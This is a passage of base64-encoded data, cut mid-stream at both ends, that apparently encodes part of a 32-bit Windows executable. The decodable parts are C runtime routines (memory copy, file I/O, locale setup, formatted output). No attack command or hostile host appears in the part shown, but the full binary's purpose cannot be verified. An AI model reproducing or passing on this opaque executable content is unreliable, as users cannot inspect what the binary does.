Tl//+DpTzl//8AK4005f//agKNhUj5//9eO00QczyLlUTl//8PtxIBtUTl//8DzmaD+gp1DmoNW2aJGAPGAbU85f//AbU85f//ZokQA8aBvTzl//+oBgAAcr8z9lZWaFUNAACNjfDr//9RjY1I+f//K8GZK8LR+FCLwVBWaOn9AAD/FXDgQACL2DveD4SXAAAAagCNhSzl//9Qi8MrxlCNhDXw6///UIuFKOX//4sA/zQH/xVs4EAAhcB0DAO1LOX//zvef8vrDP8VGOBAAImFQOX//zvef1yLhUTl//8rhTTl//+JhTjl//87RRAPggr////rP2oAjY0s5f//Uf91EP+1NOX///8w/xVs4EAAhcB0FYuFLOX//4OlQOX//wCJhTjl///rDP8VGOBAAImFQOX//4O9OOX//wB1bIO9QOX//wB0LWoFXjm1QOX//3UU6D7c///HAAkAAADoRtz//4kw6z//tUDl///oStz//1nrMYu1KOX//4sG9kQHBEB0D4uFNOX//4A4GnUEM8DrJOj+2///xwAcAAAA6Abc//+DIACDyP/rDIuFOOX//yuFMOX//19bi038M81e6BXN///Jw2oQaOD6QADo4+f//4tFCIP4/nUb6Mrb//+DIADor9v//8cACQAAAIPI/+mdAAAAM/87x3wIOwWIK0EAciHoodv//4k46Ifb///HAAkAAABXV1dXV+gP2///g8QU68mLyMH5BY0cjaArQQCL8IPmH8HmBosLD75MMQSD4QF0v1DolEkAAFmJffyLA/ZEMAQBdBb/dRD/dQz/dQjoLvj//4PEDIlF5OsW6CTb///HAAkAAADoLNv//4k4g03k/8dF/P7////oCQAAAItF5Ohj5///w/91COjeSQAAWcPMzMzMzMzMVYvsV1aLdQyLTRCLfQiLwYvRA8Y7/nYIO/gPgqQBAACB+QABAAByH4M9fCtBAAB0FldWg+cPg+YPO/5eX3UIXl9d6VtPAAD3xwMAAAB1FcHpAoPiA4P5CHIq86X/JJUETkAAkIvHugMAAACD6QRyDIPgAwPI/ySFGE1AAP8kjRROQACQ/ySNmE1AAJAoTUAAVE1AAHhNQAAj0YoGiAeKRgGIRwGKRgLB6QKIRwKDxgODxwOD+QhyzPOl/ySVBE5AAI1JACPRigaIB4pGAcHpAohHAYPGAoPHAoP5CHKm86X/JJUETkAAkCPRigaIB4PGAcHpAoPHAYP5CHKI86X/JJUETkAAjUkA+01AAOhNQADgTUAA2E1AANBNQADITUAAwE1AALhNQACLRI7kiUSP5ItEjuiJRI/oi0SO7IlEj+yLRI7wiUSP8ItEjvSJRI/0i0SO+IlEj/iLRI78iUSP/I0EjQAAAAAD8AP4/ySVBE5AAIv/FE5AABxOQAAoTkAAPE5AAItFCF5fycOQigaIB4tFCF5fycOQigaIB4pGAYhHAYtFCF5fycONSQCKBogHikYBiEcBikYCiEcCi0UIXl/Jw5CNdDH8jXw5/PfHAwAAAHUkwekCg+IDg/kIcg3986X8/ySVoE9AAIv/99n/JI1QT0AAjUkAi8e6AwAAAIP5BHIMg+ADK8j/JIWkTkAA/ySNoE9AAJC0TkAA2E5AAABPQACKRgMj0YhHA4PuAcHpAoPvAYP5CHKy/fOl/P8klaBPQACNSQCKRgMj0YhHA4pGAsHpAohHAoPuAoPvAoP5CHKI/fOl/P8klaBPQACQikYDI9GIRwOKRgKIRwKKRgHB6QKIRwGD7gOD7wOD+QgPglb////986X8/ySVoE9AAI1JAFRPQABcT0AAZE9AAGxPQAB0T0AAfE9AAIRPQACXT0AAi0SOHIlEjxyLRI4YiUSPGItEjhSJRI8Ui0SOEIlEjxCLRI4MiUSPDItEjgiJRI8Ii0SOBIlEjwSNBI0AAAAAA/AD+P8klaBPQACL/7BPQAC4T0AAyE9AANxPQACLRQheX8nDkIpGA4hHA4tFCF5fycONSQCKRgOIRwOKRgKIRwKLRQheX8nDkIpGA4hHA4pGAohHAopGAYhHAYtFCF5fycNqDGgA+0AA6Jvj//+LdQiF9nR1gz2EK0EAA3VDagToZzcAAFmDZfwAVujyTAAAWYlF5IXAdAlWUOgWTQAAWVnHRfz+////6AsAAACDfeQAdTf/dQjrCmoE6FM2AABZw1ZqAP81pChBAP8VfOBAAIXAdRboEdf//4vw/xUY4EAAUOjB1v//iQZZ6F/j///Di/9Vi+xWi3UIV1bou0QAAFmD+P90UKGgK0EAg/4BdQn2gIQAAAABdQuD/gJ1HPZARAF0FmoC6JBEAABqAYv46IdEAABZWTvHdBxW6HtEAABZUP8VJOBAAIXAdQr/FRjgQACL+OsCM/9W6NdDAACLxsH4BYsEhaArQQCD5h/B5gZZxkQwBACF/3QMV+iQ1v//WYPI/+sCM8BfXl3DahBoIPtAAOhx4v//i0UIg/j+dRvoWNb//4MgAOg91v//xwAJAAAAg8j/6Y4AAAAz/zvHfAg7BYgrQQByIegv1v//iTjoFdb//8cACQAAAFdXV1dX6J3V//+DxBTryYvIwfkFjRyNoCtBAIvwg+YfweYGiwsPvkwxBIPhAXS/UOgiRAAAWYl9/IsD9kQwBAF0Dv91COjL/v//WYlF5OsP6LrV///HAAkAAACDTeT/x0X8/v///+gJAAAAi0Xk6ADi///D/3UI6HtEAABZw4v/VYvsVot1CItGDKiDdB6oCHQa/3YI6O39//+BZgz3+///M8BZiQaJRgiJRgReXcOL/1WL7ItFCIsAgThjc23gdSqDeBADdSSLQBQ9IAWTGXQVPSEFkxl0Dj0iBZMZdAc9AECZAXUF6INVAAAzwF3CBABoHVJAAP8VTOBAADPAw4v/VYvsV7/oAwAAV/8VKOBAAP91CP8VgOBAAIHH6AMAAIH/YOoAAHcEhcB03l9dw4v/VYvs6KkEAAD/dQjo9gIAAP81ABVBAOjLDAAAaP8AAAD/0IPEDF3Di/9Vi+xoDOJAAP8VgOBAAIXAdBVo/OFAAFD/FYTgQACFwHQF/3UI/9Bdw4v/VYvs/3UI6Mj///9Z/3UI/xWI4EAAzGoI6G80AABZw2oI6IwzAABZw4v/VYvsVovw6wuLBoXAdAL/0IPGBDt1CHLwXl3Di/9Vi+xWi3UIM8DrD4XAdRCLDoXJdAL/0YPGBDt1DHLsXl3Di/9Vi+yDPbAsQQAAdBlosCxBAOjcPgAAWYXAdAr/dQj/FbAsQQBZ6McfAABoeOFAAGhg4UAA6KH///9ZWYXAdUJo5F5AAOimVQAAuFjhQADHBCRc4UAA6GP///+DPbQsQQAAWXQbaLQsQQDohD4AAFmFwHQMagBqAmoA/xW0LEEAM8Bdw2oYaED7QADor9///2oI6IszAABZg2X8ADPbQzkdbCNBAA+ExQAAAIkdaCNBAIpFEKJkI0EAg30MAA+FnQAAAP81qCxBAOhaCwAAWYv4iX3Yhf90eP81pCxBAOhFCwAAWYvwiXXciX3kiXXgg+4EiXXcO/dyV+ghCwAAOQZ07Tv3ckr/NugbCwAAi/joCwsAAIkG/9f/NagsQQDoBQsAAIv4/zWkLEEA6PgKAACDxAw5feR1BTlF4HQOiX3kiX3YiUXgi/CJddyLfdjrn2iI4UAAuHzhQADoX/7//1lokOFAALiM4UAA6E/+//9Zx0X8/v///+gfAAAAg30QAHUoiR1sI0EAagjouTEAAFn/dQjo/P3//zPbQ4N9EAB0CGoI6KAxAABZw+jV3v//w4v/VYvsagBqAP91COjD/v//g8QMXcOL/1WL7GoAagH/dQjorf7//4PEDF3DagFqAGoA6J3+//+DxAzDagFqAWoA6I7+//+DxAzDi/9W6B0KAACL8FboLVYAAFbo4TsAAFboa9D//1boDFYAAFbo91UAAFbo31MAAFbo/gEAAFbohFIAAGgjVUAA6G8JAACDxCSjABVBAF7Di/9Vi+xRUVOLXQhWVzP2M/+Jffw7HP0IFUEAdAlHiX38g/8Xcu6D/xcPg3cBAABqA+jqWAAAWYP4AQ+ENAEAAGoD6NlYAABZhcB1DYM9ABBBAAEPhBsBAACB+/wAAAAPhEEBAABoyOdAALsUAwAAU79wI0EAV+g9WAAAg8QMhcB0DVZWVlZW6LzP//+DxBRoBAEAAL6JI0EAVmoAxgWNJEEAAP8VkOBAAIXAdSZosOdAAGj7AgAAVuj7VwAAg8QMhcB0DzPAUFBQUFDoeM///4PEFFbo8h0AAEBZg/g8djhW6OUdAACD7jsDxmoDuYQmQQBorOdAACvIUVDoA1cAAIPEFIXAdBEz9lZWVlZW6DXP//+DxBTrAjP2aKjnQABTV+hpVgAAg8QMhcB0DVZWVlZW6BHP//+DxBSLRfz/NMUMFUEAU1foRFYAAIPEDIXAdA1WVlZWVujszv//g8QUaBAgAQBogOdAAFfot1QAAIPEDOsyavT/FYzgQACL2DvedCSD+/90H2oAjUX4UI00/QwVQQD/NugwHQAAWVD/NlP/FWzgQABfXlvJw2oD6G5XAABZg/gBdBVqA+hhVwAAWYXAdR+DPQAQQQABdRZo/AAAAOgp/v//aP8AAADoH/7//1lZw8OL/1WL7FFRVujBCQAAi/CF9g+ERgEAAItWXKHMFUEAV4t9CIvKUzk5dA6L2GvbDIPBDAPaO8ty7mvADAPCO8hzCDk5dQSLwesCM8CFwHQKi1gIiV38hdt1BzPA6fsAAACD+wV1DINgCAAzwEDp6gAAAIP7AQ+E3gAAAItOYIlN+ItNDIlOYItIBIP5CA+FuAAAAIsNwBVBAIs9xBVBAIvRA/k7130ka8kMi35cg2Q5CACLPcAVQQCLHcQVQQBCA9+DwQw703zii138iwCLfmQ9jgAAwHUJx0ZkgwAAAOtePZAAAMB1CcdGZIEAAADrTj2RAADAdQnHRmSEAAAA6z49kwAAwHUJx0ZkhQAAAOsuPY0AAMB1CcdGZIIAAADrHj2PAADAdQnHRmSGAAAA6w49kgAAwHUHx0ZkigAAAP92ZGoI/9NZiX5k6weDYAgAUf/Ti0X4WYlGYIPI/1tfXsnDocQ8QQAz0oXAdQW42PdAAA+3CGaD+SB3CWaFyXQnhdJ0G2aD+SJ1CTPJhdIPlMGL0UBA69tmg/kgdwpAQA+3CGaFyXXww4v/Vos1BCBBAFcz/4X2dRqDyP/prAAAAGaD+D10AUdW6CpWAABZjXRGAg+3BmaFwHXmU2oER1foSRoAAIvYWVmJHVQjQQCF23UFg8j/63SLNQQgQQDrRFbo8lUAAIv4R2aDPj1ZdDFqAlfoFhoAAFlZiQOFwHRQVldQ6GFVAACDxAyFwHQPM8BQUFBQUOgrzP//g8QUg8MEjTR+ZoM+AHW2/zUEIEEA6Bn2//+DJQQgQQAAgyMAxwWgLEEAAQAAADPAWVtfXsP/NVQjQQDo8/X//4MlVCNBAACDyP/r5Iv/VYvsUVYz0leLfQyJE4vxxwcBAAAAOVUIdAmLTQiDRQgEiTFmgzgidROLfQwzyYXSD5TBaiJAQIvRWesY/wOF9nQIZosIZokORkYPtwhAQGaFyXQ8hdJ1y2aD+SB0BmaD+Ql1v4X2dAYzyWaJTv6DZfwAM9JmORAPhMMAAAAPtwhmg/kgdAZmg/kJdQhAQOvtSEjr2mY5EA+EowAAADlVCHQJi00Ig0UIBIkx/wcz/0cz0usDQEBCZoM4XHT3ZoM4InU49sIBdSCDffwAdA2NSAJmgzkidQSLwesNM8kz/zlN/A+UwYlN/NHq6w9KhfZ0CGpcWWaJDkZG/wOF0nXtD7cIZoXJdCQ5Vfx1DGaD+SB0GWaD+Ql0E4X/dAuF9nQFZokORkb/A0BA64KF9nQHM8lmiQ5GRv8Di30M6TL///+LRQg7wnQCiRD/B19eycOL/1WL7FFRU1ZXaAQBAAC+iCZBAFYzwDPbU2ajkChBAP8VlOBAAKHEPEEAiTVgI0EAO8N0B4v4ZjkYdQKL/o1F/FBTjV34M8mLx+hg/v//i138WVmB+////z9zSotN+IH5////f3M/jQRZA8ADyTvBcjRQ6JkXAACL8FmF9nQnjUX8UI0MnlaNXfiLx+ge/v//i0X8SFmjQCNBAFmJNUgjQQAzwOsDg8j/X15bycOL/1b/FZzgQACL8DPJO/F1BDPAXsNmOQ50DkBAZjkIdflAQGY5CHXyK8ZAU0CL2FdT6C0XAACL+FmF/3UNVv8VmOBAAIvHX1tew1NWV+gx8P//g8QM6+b/JQTgQABqVGhg+0AA6CbX//8z/4l9/I1FnFD/FajgQADHRfz+////akBqIF5W6B4XAABZWTvHD4QUAgAAo6ArQQCJNYgrQQCNiAAIAADrMMZABACDCP/GQAUKiXgIxkAkAMZAJQrGQCYKiXg4xkA0AIPAQIsNoCtBAIHBAAgAADvBcsxmOX3OD4QKAQAAi0XQO8cPhP8AAACLOI1YBI0EO4lF5L4ACAAAO/58Aov+x0XgAQAAAOtbakBqIOiQFgAAWVmFwHRWi03gjQyNoCtBAIkBgwWIK0EAII2QAAgAAOsqxkAEAIMI/8ZABQqDYAgAgGAkgMZAJQrGQCYKg2A4AMZANACDwECLEQPWO8Jy0v9F4Dk9iCtBAHyd6waLPYgrQQCDZeAAhf9+bYtF5IsIg/n/dFaD+f50UYoDqAF0S6gIdQtR/xWk4EAAhcB0PIt14IvGwfgFg+YfweYGAzSFoCtBAItF5IsAiQaKA4hGBGigDwAAjUYMUOh7MwAAWVmFwA+EyQAAAP9GCP9F4EODReQEOX3gfJMz24vzweYGAzWgK0EAiwaD+P90C4P4/nQGgE4EgOtyxkYEgYXbdQVq9ljrCovDSPfYG8CDwPVQ/xWM4EAAi/iD//90Q4X/dD9X/xWk4EAAhcB0NIk+Jf8AAACD+AJ1BoBOBEDrCYP4A3UEgE4ECGigDwAAjUYMUOjlMgAAWVmFwHQ3/0YI6wqATgRAxwb+////Q4P7Aw+MZ/////81iCtBAP8VoOBAADPA6xEzwEDDi2Xox0X8/v///4PI/+gk1f//w4v/VriA+UAAvoD5QABXi/g7xnMPiweFwHQC/9CDxwQ7/nLxX17Di/9WuIj5QAC+iPlAAFeL+DvGcw+LB4XAdAL/0IPHBDv+cvFfXsOL/1WL7Fb/NRQWQQCLNbDgQAD/1oXAdCGhEBZBAIP4/3QXUP81FBZBAP/W/9CFwHQIi4D4AQAA6ye+cOhAAFb/FYDgQACFwHULVugU8///WYXAdBhoYOhAAFD/FYTgQACFwHQI/3UI/9CJRQiLRQheXcNqAOiH////WcOL/1WL7Fb/NRQWQQCLNbDgQAD/1oXAdCGhEBZBAIP4/3QXUP81FBZBAP/W/9CFwHQIi4D8AQAA6ye+cOhAAFb/FYDgQACFwHULVuiZ8v//WYXAdBhojOhAAFD/FYTgQACFwHQI/3UI/9CJRQiLRQheXcP/FbTgQADCBACL/1b/NRQWQQD/FbDgQACL8IX2dRv/NZgoQQDoZf///1mL8Fb/NRQWQQD/FbjgQACLxl7DoRAWQQCD+P90FlD/NaAoQQDoO////1n/0IMNEBZBAP+hFBZBAIP4/3QOUP8VvOBAAIMNFBZBAP/p3SUAAGoMaID7QADoH9P//75w6EAAVv8VgOBAAIXAdQdW6Nrx//9ZiUXki3UIx0Zc6OdAADP/R4l+FIXAdCRoYOhAAFCLHYTgQAD/04mG+AEAAGiM6EAA/3Xk/9OJhvwBAACJfnDGhsgAAABDxoZLAQAAQ8dGaCAWQQBqDeiRJgAAWYNl/AD/dmj/FcDgQADHRfz+////6D4AAABqDOhwJgAAWYl9/ItFDIlGbIXAdQihKBxBAIlGbP92bOi/DgAAWcdF/P7////oFQAAAOii0v//wzP/R4t1CGoN6FglAABZw2oM6E8lAABZw4v/Vlf/FRjgQAD/NRAWQQCL+OiR/v///9CL8IX2dU5oFAIAAGoB6DISAACL8FlZhfZ0Olb/NRAWQQD/NZwoQQDo6P3//1n/0IXAdBhqAFboxf7//1lZ/xXE4EAAg04E/4kG6wlW6DPu//9ZM/ZX/xUQ4EAAX4vGXsOL/1bof////4vwhfZ1CGoQ6Lfw//9Zi8Zew2oIaKj7QADopdH//4t1CIX2D4T4AAAAi0YkhcB0B1Do5u3//1mLRiyFwHQHUOjY7f//WYtGNIXAdAdQ6Mrt//9Zi0Y8hcB0B1DovO3//1mLRkCFwHQHUOiu7f//WYtGRIXAdAdQ6KDt//9Zi0ZIhcB0B1Doku3//1mLRlw96OdAAHQHUOiB7f//WWoN6AMlAABZg2X8AIt+aIX/dBpX/xXI4EAAhcB1D4H/IBZBAHQHV+hU7f//WcdF/P7////oVwAAAGoM6MokAABZx0X8AQAAAIt+bIX/dCNX6LENAABZOz0oHEEAdBSB/1AbQQB0DIM/AHUHV+i9CwAAWcdF/P7////oHgAAAFbo/Oz//1no4tD//8IEAIt1CGoN6JkjAABZw4t1CGoM6I0jAABZw4v/Vle+cOhAAFb/FYDgQACFwHUHVug57///WYv4hf8PhF4BAACLNYTgQABovOhAAFf/1miw6EAAV6OUKEEA/9ZopOhAAFejmChBAP/WaJzoQABXo5woQQD/1oM9lChBAACLNbjgQACjoChBAHQWgz2YKEEAAHQNgz2cKEEAAHQEhcB1JKGw4EAAo5goQQChvOBAAMcFlChBAPdfQACJNZwoQQCjoChBAP8VtOBAAKMUFkEAg/j/D4TMAAAA/zWYKEEAUP/WhcAPhLsAAADoa/H///81lChBAOgT+////zWYKEEAo5QoQQDoA/v///81nChBAKOYKEEA6PP6////NaAoQQCjnChBAOjj+v//g8QQo6AoQQDozyEAAIXAdGVo62FAAP81lChBAOg9+///Wf/QoxAWQQCD+P90SGgUAgAAagHoVA8AAIvwWVmF9nQ0Vv81EBZBAP81nChBAOgK+///Wf/QhcB0G2oAVujn+///WVn/FcTgQACDTgT/iQYzwEDrB+iS+///M8BfXsOL/1WL7DPAOUUIagAPlMBoABAAAFD/FczgQACjpChBAIXAdQJdwzPAQKOEK0EAXcOL/1WL7IPsEKEEEEEAg2X4AINl/ABTV79O5kC7uwAA//87x3QNhcN0CffQowgQQQDrYFaNRfhQ/xXg4EAAi3X8M3X4/xXc4EAAM/D/FcTgQAAz8P8V2OBAADPwjUXwUP8V1OBAAItF9DNF8DPwO/d1B75P5kC76wuF83UHi8bB4BAL8Ik1BBBBAPfWiTUIEEEAXl9bycODJYArQQAAw4v/VYvsUVGLRQxWi3UIiUX4i0UQV1aJRfzouy8AAIPP/1k7x3UR6N3B///HAAkAAACLx4vX60r/dRSNTfxR/3X4UP8VYOBAAIlF+DvHdRP/FRjgQACFwHQJUOjPwf//WevPi8bB+AWLBIWgK0EAg+YfweYGjUQwBIAg/YtF+ItV/F9eycNqFGjQ+0AA6JbN//+Dzv+JddyJdeCLRQiD+P51HOh0wf//gyAA6FnB///HAAkAAACLxovW6dAAAAAz/zvHfAg7BYgrQQByIehKwf//iTjoMMH//8cACQAAAFdXV1dX6LjA//+DxBTryIvIwfkFjRyNoCtBAIvwg+YfweYGiwsPvkwxBIPhAXUm6AnB//+JOOjvwP//xwAJAAAAV1dXV1fod8D//4PEFIPK/4vC61tQ6BcvAABZiX38iwP2RDAEAXQc/3UU/3UQ/3UM/3UI6Kn+//+DxBCJRdyJVeDrGuihwP//xwAJAAAA6KnA//+JOINN3P+DTeD/x0X8/v///+gMAAAAi0Xci1Xg6NnM///D/3UI6FQvAABZw4v/VYvs/wU4I0EAaAAQAADoSAwAAFmLTQiJQQiFwHQNg0kMCMdBGAAQAADrEYNJDASNQRSJQQjHQRgCAAAAi0EIg2EEAIkBXcOL/1WL7ItFCIP4/nUP6A/A///HAAkAAAAzwF3DVjP2O8Z8CDsFiCtBAHIc6PG///9WVlZWVscACQAAAOh5v///g8QUM8DrGovIg+AfwfkFiwyNoCtBAMHgBg++RAEEg+BAXl3DLaQDAAB0IoPoBHQXg+gNdAxIdAMzwMO4BAQAAMO4EgQAAMO4BAgAAMO4EQQAAMOL/1ZXi/BoAQEAADP/jUYcV1Do+tv//zPAD7fIi8GJfgSJfgiJfgzB4RALwY1+EKurq7kgFkEAg8QMjUYcK86/AQEAAIoUAYgQQE91942GHQEAAL4AAQAAihQIiBBATnX3X17Di/9Vi+yB7BwFAAChBBBBADPFiUX8U1eNhej6//9Q/3YE/xXk4EAAvwABAACFwA+E+wAAADPAiIQF/P7//0A7x3L0ioXu+v//xoX8/v//IITAdC6Nne/6//8PtsgPtgM7yHcWK8FAUI2UDfz+//9qIFLoN9v//4PEDEOKA0OEwHXYagD/dgyNhfz6////dgRQV42F/P7//1BqAWoA6GpMAAAz21P/dgSNhfz9//9XUFeNhfz+//9QV/92DFPoS0oAAIPERFP/dgSNhfz8//9XUFeNhfz+//9QaAACAAD/dgxT6CZKAACDxCQzwA+3jEX8+v//9sEBdA6ATAYdEIqMBfz9///rEfbBAnQVgEwGHSCKjAX8/P//iIwGHQEAAOsIxoQGHQEAAABAO8dyvutWjYYdAQAAx4Xk+v//n////zPJKYXk+v//i5Xk+v//jYQOHQEAAAPQjVogg/sZdwyATA4dEIrRgMIg6w+D+hl3DoBMDh0gitGA6iCIEOsDxgAAQTvPcsKLTfxfM81b6Nyu///Jw2oMaPD7QADoqsn//+ja9///i/ihRBtBAIVHcHQdg39sAHQXi3dohfZ1CGog6Ibo//9Zi8bowsn//8NqDehYHQAAWYNl/ACLd2iJdeQ7NUgaQQB0NoX2dBpW/xXI4EAAhcB1D4H+IBZBAHQHVuie5f//WaFIGkEAiUdoizVIGkEAiXXkVv8VwOBAAMdF/P7////oBQAAAOuOi3Xkag3oHRwAAFnDi/9Vi+yD7BBTM9tTjU3w6Cu///+JHagoQQCD/v51HscFqChBAAEAAAD/FezgQAA4Xfx0RYtN+INhcP3rPIP+/XUSxwWoKEEAAQAAAP8V6OBAAOvbg/78dRKLRfCLQATHBagoQQABAAAA68Q4Xfx0B4tF+INgcP2LxlvJw4v/VYvsg+wgoQQQQQAzxYlF/FOLXQxWi3UIV+hk////i/gz9ol9CDv+dQ6Lw+i3/P//M8DpnQEAAIl15DPAObhQGkEAD4SRAAAA/0Xkg8AwPfAAAABy54H/6P0AAA+EcAEAAIH/6f0AAA+EZAEAAA+3x1D/FfDgQACFwA+EUgEAAI1F6FBX/xXk4EAAhcAPhDMBAABoAQEAAI1DHFZQ6FfY//8z0kKDxAyJewSJcww5VegPhvgAAACAfe4AD4TPAAAAjXXvig6EyQ+EwgAAAA+2Rv8PtsnppgAAAGgBAQAAjUMcVlDoENj//4tN5IPEDGvJMIl14I2xYBpBAIl15OsqikYBhMB0KA+2Pg+2wOsSi0XgioBMGkEACEQ7HQ+2RgFHO/h26ot9CEZGgD4AddGLdeT/ReCDxgiDfeAEiXXkcumLx4l7BMdDCAEAAADoZ/v//2oGiUMMjUMQjYlUGkEAWmaLMUFmiTBBQEBKdfOL8+jX+///6bf+//+ATAMdBEA7wXb2RkaAfv8AD4U0////jUMeuf4AAACACAhASXX5i0ME6BL7//+JQwyJUwjrA4lzCDPAD7fIi8HB4RALwY17EKurq+uoOTWoKEEAD4VY/v//g8j/i038X14zzVvo16v//8nDahRoEPxAAOilxv//g03g/+jR9P//i/iJfdzo3Pz//4tfaIt1COh1/f//iUUIO0MED4RXAQAAaCACAADoRQYAAFmL2IXbD4RGAQAAuYgAAACLd2iL+/OlgyMAU/91COi4/f//WVmJReCFwA+F/AAAAIt13P92aP8VyOBAAIXAdRGLRmg9IBZBAHQHUOh64v//WYleaFOLPcDgQAD/1/ZGcAIPheoAAAD2BUQbQQABD4XdAAAAag3o2RkAAFmDZfwAi0MEo7goQQCLQwijvChBAItDDKPAKEEAM8CJReSD+AV9EGaLTEMQZokMRawoQQBA6+gzwIlF5D0BAQAAfQ2KTBgciIhAGEEAQOvpM8CJReQ9AAEAAH0QiowYHQEAAIiISBlBAEDr5v81SBpBAP8VyOBAAIXAdROhSBpBAD0gFkEAdAdQ6MHh//9ZiR1IGkEAU//Xx0X8/v///+gCAAAA6zBqDehSGAAAWcPrJYP4/3UggfsgFkEAdAdT6Ivh//9Z6A25///HABYAAADrBINl4ACLReDoXcX//8ODPawsQQAAdRJq/ehW/v//WccFrCxBAAEAAAAzwMOL/1WL7FNWi3UIi4a8AAAAM9tXO8N0bz14HkEAdGiLhrAAAAA7w3ReORh1WouGuAAAADvDdBc5GHUTUOgS4f///7a8AAAA6IxIAABZWYuGtAAAADvDdBc5GHUTUOjx4P///7a8AAAA6CZIAABZWf+2sAAAAOjZ4P///7a8AAAA6M7g//9ZWYuGwAAAADvDdEQ5GHVAi4bEAAAALf4AAABQ6K3g//+LhswAAAC/gAAAACvHUOia4P//i4bQAAAAK8dQ6Izg////tsAAAADogeD//4PEEI2+1AAAAIsHPbgdQQB0FzmYtAAAAHUPUOgMRgAA/zfoWuD//1lZjX5Qx0UIBgAAAIF/+EgbQQB0EYsHO8N0CzkYdQdQ6DXg//9ZOV/8dBKLRwQ7w3QLORh1B1DoHuD//1mDxxD/TQh1x1boD+D//1lfXltdw4v/VYvsU1aLNcDgQABXi30IV//Wi4ewAAAAhcB0A1D/1ouHuAAAAIXAdANQ/9aLh7QAAACFwHQDUP/Wi4fAAAAAhcB0A1D/1o1fUMdFCAYAAACBe/hIG0EAdAmLA4XAdANQ/9aDe/wAdAqLQwSFwHQDUP/Wg8MQ/00IddaLh9QAAAAFtAAAAFD/1l9eW13Di/9Vi+xXi30Ihf8PhIMAAABTVos1yOBAAFf/1ouHsAAAAIXAdANQ/9aLh7gAAACFwHQDUP/Wi4e0AAAAhcB0A1D/1ouHwAAAAIXAdANQ/9aNX1DHRQgGAAAAgXv4SBtBAHQJiwOFwHQDUP/Wg3v8AHQKi0MEhcB0A1D/1oPDEP9NCHXWi4fUAAAABbQAAABQ/9ZeW4vHX13Dhf90N4XAdDNWizA793QoV4k46MH+//9ZhfZ0G1boRf///4M+AFl1D4H+UBtBAHQHVuhZ/f//WYvHXsMzwMNqDGgw/EAA6D7C///obvD//4vwoUQbQQCFRnB0IoN+bAB0HOhX8P//i3BshfZ1CGog6BXh//9Zi8boUcL//8NqDOjnFQAAWYNl/ACNRmyLPSgcQQDoaf///4lF5MdF/P7////oAgAAAOvBagzo4hQAAFmLdeTDi/9Vi+yD7BChBBBBADPFiUX8U1aLdQz2RgxAVw+FNgEAAFboQMb//1m70BVBAIP4/3QuVugvxv//WYP4/nQiVugjxv//wfgFVo08haArQQDoE8b//4PgH1nB4AYDB1nrAovDikAkJH88Ag+E6AAAAFbo8sX//1mD+P90Llbo5sX//1mD+P50Ilbo2sX//8H4BVaNPIWgK0EA6MrF//+D4B9ZweAGAwdZ6wKLw4pAJCR/PAEPhJ8AAABW6KnF//9Zg/j/dC5W6J3F//9Zg/j+dCJW6JHF///B+AVWjTyFoCtBAOiBxf//g+AfWcHgBgMHWesCi8P2QASAdF3/dQiNRfRqBVCNRfBQ6DtJAACDxBCFwHQHuP//AADrXTP/OX3wfjD/TgR4EosGikw99IgIiw4PtgFBiQ7rDg++RD30VlDoWLX//1lZg/j/dMhHO33wfNBmi0UI6yCDRgT+eA2LDotFCGaJAYMGAusND7dFCFZQ6PJFAABZWYtN/F9eM81b6HOl///Jw4v/Vlcz/423QBxBAP826Kjr//+DxwRZiQaD/yhy6F9ew4v/VYvsVlcz9v91COgESQAAi/hZhf91JzkF6ChBAHYfVv8VKOBAAI2G6AMAADsF6ChBAHYDg8j/i/CD+P91yovHX15dw4v/VYvsVlcz9moA/3UM/3UI6IRJAACL+IPEDIX/dSc5BegoQQB2H1b/FSjgQACNhugDAAA7BegoQQB2A4PI/4vwg/j/dcOLx19eXcOL/1WL7FZXM/b/dQz/dQjoWEoAAIv4WVmF/3UsOUUMdCc5BegoQQB2H1b/FSjgQACNhugDAAA7BegoQQB2A4PI/4vwg/j/dcGLx19eXcOhBBBBAIPIATPJOQXsKEEAD5TBi8HDzMzMzMzMzMzMzMyLTCQE98EDAAAAdCSKAYPBAYTAdE73wQMAAAB17wUAAAAAjaQkAAAAAI2kJAAAAACLAbr//v5+A9CD8P8zwoPBBKkAAQGBdOiLQfyEwHQyhOR0JKkAAP8AdBOpAAAA/3QC682NQf+LTCQEK8HDjUH+i0wkBCvBw41B/YtMJAQrwcONQfyLTCQEK8HDi/9Vi+yD7BBTVot1DDPbO/N0FTldEHQQOB51EotFCDvDdAUzyWaJCDPAXlvJw/91FI1N8OiVtP//i0XwOVgUdR+LRQg7w3QHZg+2DmaJCDhd/HQHi0X4g2Bw/TPAQOvKjUXwUA+2BlDoxAAAAFlZhcB0fYtF8IuIrAAAAIP5AX4lOU0QfCAz0jldCA+VwlL/dQhRVmoJ/3AE/xVk4EAAhcCLRfB1EItNEDuIrAAAAHIgOF4BdBuLgKwAAAA4XfwPhGX///+LTfiDYXD96Vn////orLH//8cAKgAAADhd/HQHi0X4g2Bw/YPI/+k6////M8A5XQgPlcBQ/3UIi0XwagFWagn/cAT/FWTgQACFwA+FOv///+u6i/9Vi+xqAP91EP91DP91COjU/v//g8QQXcOL/1WL7IPsEP91DI1N8OiKs///D7ZFCItN8IuJyAAAAA+3BEElAIAAAIB9/AB0B4tN+INhcP3Jw4v/VYvsagD/dQjouf///1lZXcOL/1WL7PZADEB0BoN4CAB0GlD/dQjoN/v//1lZuf//AABmO8F1BYMO/13D/wZdw4v/VYvsVovw6xT/dQiLRRD/TQzouf///4M+/1l0BoN9DAB/5l5dw4v/VYvs9kcMQFNWi/CL2XQ3g38IAHUxi0UIAQbrMA+3A/9NCFCLx+h+////Q0ODPv9ZdRTod7D//4M4KnUQaj+Lx+hj////WYN9CAB/0F5bXcOL/1WL7IHsdAQAAKEEEEEAM8WJRfxTi10UVot1CDPAV/91EIt9DI2NtPv//4m1xPv//4md6Pv//4mFrPv//4mF+Pv//4mF1Pv//4mF9Pv//4mF3Pv//4mFsPv//4mF2Pv//+hDsv//hfZ1Nejur///xwAWAAAAM8BQUFBQUOh0r///g8QUgL3A+///AHQKi4W8+///g2Bw/YPI/+nPCgAAM/Y7/nUS6LOv//9WVlZWxwAWAAAAVuvFD7cPibXg+///ibXs+///ibXM+///ibWo+///iY3k+///ZjvOD4R0CgAAagJaA/o5teD7//+JvaD7//8PjEgKAACNQeBmg/hYdw8Pt8EPtoBI80AAg+AP6wIzwIu1zPv//2vACQ+2hDBo80AAagjB6AReiYXM+///O8YPhDP///+D+AcPh90JAAD/JIWfgkAAM8CDjfT7////iYWk+///iYWw+///iYXU+///iYXc+///iYX4+///iYXY+///6bAJAAAPt8GD6CB0SIPoA3Q0K8Z0JCvCdBSD6AMPhYYJAAAJtfj7///phwkAAI